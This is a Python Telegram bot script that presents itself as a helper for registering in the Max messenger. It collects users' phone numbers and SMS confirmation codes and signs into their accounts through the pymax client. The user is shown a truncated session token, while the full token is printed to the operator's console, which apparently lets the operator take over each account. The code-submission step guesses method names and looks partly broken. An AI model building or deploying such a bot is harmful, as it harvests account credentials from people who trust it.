import asyncio
import os
import traceback
from typing import Dict

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from dotenv import load_dotenv

from pymax import SocketMaxClient
from pymax.payloads import UserAgentPayload

# ========== ЗАГРУЗКА ПЕРЕМЕННЫХ ==========
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN не найден в .env файле")

# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ========== СОСТОЯНИЯ ==========
class RegStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ========== ВРЕМЕННОЕ ХРАНИЛИЩЕ ==========
temp_sessions: Dict[int, dict] = {}

# ========== КОМАНДА /START ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer(
        "👋 Привет! Я помогу зарегистрироваться в Max.\n\n"
        "Введите ваш номер телефона в формате:\n"
        "`+79123456789`",
        parse_mode="Markdown"
    )
    await state.set_state(RegStates.waiting_phone)

# ========== ОБРАБОТКА НОМЕРА ==========
@dp.message(RegStates.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_id = message.from_user.id
    
    if not phone.startswith("+") or not phone[1:].isdigit():
        await message.answer("❌ Неверный формат. Пример: `+79123456789`", parse_mode="Markdown")
        return
    
    await message.answer(f"📱 Отправляю запрос на номер {phone}...")
    
    try:
        # Создаём клиент
        ua = UserAgentPayload(device_type="DESKTOP", app_version="25.12.13")
        client = SocketMaxClient(
            phone=phone,
            work_dir=f"cache_{user_id}",
            headers=ua
        )
        
        # Сохраняем клиент
        temp_sessions[user_id] = {
            "client": client,
            "phone": phone
        }
        
        # Запускаем авторизацию в отдельной задаче
        async def auth_task():
            try:
                # Запускаем процесс авторизации
                await client.start()
                
                # После успешной авторизации
                if client.is_authorized:
                    token = client.me.token
                    await message.answer(
                        f"✅ **Регистрация успешна!**\n\n"
                        f"📱 Номер: `{phone}`\n"
                        f"🔑 Токен: `{token[:30]}...`",
                        parse_mode="Markdown"
                    )
                    print(f"✅ Токен: {token}")
                else:
                    await message.answer("❌ Не удалось авторизоваться.")
                    
            except Exception as e:
                print(f"[ERROR] auth_task: {e}")
                await message.answer(f"❌ Ошибка: {e}")
            finally:
                # Очищаем сессию
                if user_id in temp_sessions:
                    del temp_sessions[user_id]
                await state.clear()
        
        # Запускаем задачу
        asyncio.create_task(auth_task())
        
        # Просим код
        await message.answer("📲 Код отправлен! Введите код из SMS:")
        await state.set_state(RegStates.waiting_code)
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")

# ========== ОБРАБОТКА КОДА ==========
@dp.message(RegStates.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    user_id = message.from_user.id
    
    if user_id not in temp_sessions:
        await message.answer("❌ Сессия истекла. Начните заново с /start")
        await state.clear()
        return
    
    session = temp_sessions[user_id]
    client = session["client"]
    
    try:
        # Передаём код в клиент
        if hasattr(client, 'confirm_code'):
            await client.confirm_code(code)
        elif hasattr(client, 'verify_code'):
            await client.verify_code(code)
        elif hasattr(client, 'submit_code'):
            await client.submit_code(code)
        else:
            # Если нет метода, пробуем установить напрямую
            client._code = code
        
        await message.answer("🔐 Код принят, завершаю регистрацию...")
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")

# ========== ЗАПУСК ==========
async def main():
    print("=" * 50)
    print("🚀 Бот запущен")
    print("=" * 50)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
